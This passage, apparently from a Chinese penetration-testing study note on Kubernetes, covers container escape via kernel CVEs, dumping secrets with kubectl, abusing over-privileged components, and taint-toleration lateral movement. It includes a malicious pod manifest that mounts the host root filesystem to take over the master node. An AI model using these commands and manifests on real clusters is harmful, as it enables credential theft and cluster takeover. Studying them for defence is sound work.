这个原理在docker逃逸的文章也解释了，就是容器与宿主机共享内核并使用内核功能（比如cgroup和namespace）进行容器和宿主机的隔离，我们可以使用内核提权漏洞来进行逃逸，常见如下：

* CVE-2016-5195 DirtyCow：执行 `uname -r`，**2.6.22<=内核版本<=4.8.3**时可能存在
* CVE-2020-14386：**4.6<=内核版本<=5.9**时可能存在
* CVE-2022-0847：**内核版本小于5.16.11且不是5.15.25、5.10.102**时可能存在

### 总结

可以看见k8s中权限提升的常见方法就是权限滥用或容器逃逸

## 5.横向移动

### 窃取凭证

#### kubeconfig凭证

kubeconfig文件通常出现在运维PC、内网跳板机、堡垒机、master节点等机器上，kubeconfig文件的使用在前面初始访问部分的笔记中已经介绍了，这里不再说明

#### secret对象

在k8s中，secret对象用于存储密码、OAuth令牌、ssh密钥等敏感信息，我们可以尝试从中窃取其他服务的通信凭证：

~~~sh
kubeconfig get secrets -A
~~~

![QQ_1757151099118](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151099118.png)

查看指定secret内容：

~~~sh
kubectl --kubeconfig config -n [指定命名空间] get secret [secret名称] -o yaml
~~~

![QQ_1757151463832](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151463832.png)

可惜这里案例上是hash，如果是硬编码在secret中，就可以解码获取明文密码了

### 集群内网渗透

K8s默认允许集群内部的pod和service直接通信，在没有NetworkPolicy / eBPF限制的情况下，无论是node还是pod，内网的通信和常规内网渗透的情况基本无差异，我们仍然可以使用nmap、masscan、fscan等扫描工具进行内网探索，也可以使用常规内网的横向移动手段

### 第三方组件风险

在很多k8s的配置教程中会存在一些忽略真实环境安全问题的情况，导致一些插件/服务存在未授权的情况，甚至是服务账号具有高权限，基于这些情况，我们可以关注一些常见的服务账号比如helm、cilium、Nginx Ingress、Prometheus，比如helm v2版本默认存在高权限账号，那么可以利用高权限给自己赋予cluster-admin进而提权逃逸

简而言之，我们的思路可以是：进入pod，通过漏洞/未授权攻击第三方组件，利用组件的不当权限操作k8s集群

### 污点（taint）横向

这个方法较为鸡肋，原因是k8s污点横向需要配合一些漏洞，而这些配合漏洞往往可以单独拿到权限

污点是k8s高级调度的特性，用于限制哪些pod能被调度到某一节点上

其中污点有三种属性(效果)：

> 1. **NoSchedule**：这是最常见的类型，表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。
> 2. **PreferNoSchedule**：这种类型表示不推荐但允许 Pod 被调度到带有此污点的节点上。即使节点上设置了 `PreferNoSchedule` 污点，如果没有其他更适合的节点，Pod 仍然可以被调度到这些节点上。
> 3. **NoExecute**：这种类型表示节点上的Pod会被驱逐（Eviction），即使它们已经运行在该节点上。通常，`NoExecute` 污点会导致 Pod 被终止并迁移到其他节点。

一般来说master节点包含一个污点，而这个污点通常用于阻止pod调度到主节点上，除非pod能容忍该污点（通常容忍这个污点的pod都是系统级，别比如kube-system命名空间下的pod），在普通节点横向时，我们可以使用污点容忍度创建恶意pod尝试横向到主节点

比如：获取worker节点权限，创建配置了与master节点污点对应容忍度的恶意node，yaml如下：

~~~sh
cat > x.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: control-master-x
spec:
  tolerations:
  - key: "node-role.kubernetes.io/master"
    operator: "Exists"
    effect: "NoSchedule"
  containers:
  - name: control-master-x
    image: ubuntu:18.04
    command: ["/bin/sleep", "3650d"]
    volumeMounts:
    - name: master
      mountPath: /master
  volumes:
  - name: master
    hostPath:
      path: /
      type: Directory
EOF
~~~

这样create的pod允许被调度到主节点，这里多次尝试创建就有机会创建到master节点，进而逃逸接管master节点

### 其他横向

之前笔记中提到的权限提升阶段的逃逸手法也能用于横向移动，另外，在高权限情况下接管dashboard也能直接在面板下发指令，实现横向

### 总结

可以看到k8s的横向方式都是换汤不换药，无非基于服务、凭证、逃逸、常规内网横向，很多问题都是管理员配置不当产生

